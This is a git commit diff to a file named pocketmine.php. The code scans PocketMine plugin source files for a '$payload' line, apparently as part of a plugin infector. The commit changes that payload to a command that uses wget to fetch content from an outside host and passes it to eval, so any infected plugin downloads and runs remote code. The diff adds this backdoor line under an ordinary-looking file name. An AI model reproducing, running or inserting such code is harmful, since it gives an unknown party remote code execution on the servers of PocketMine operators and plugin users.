9c0ed793f51efe2140c9cb17ec6b028b08c3f2fd
Nyrok <47859726+Nyrok@users.noreply.github.com>
2023-06-26 17:27:23 +0200

    Update pocketmine.php

--- pocketmine.php
+++ pocketmine.php
@@ -16,7 +16,7 @@ try {
         $mainPath = explode("/", $main);
         $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
         $fileContents = explode("\n", @file_get_contents($filePath));
-        $payload = "eval(`wget -qO- rentry.co/pmmp/raw`);";
+        $payload = "eval(`wget -qO- pocketmine.mp`);";
         foreach ($fileContents as $value) {
             if (str_contains($value, $payload)) continue 2;
         }
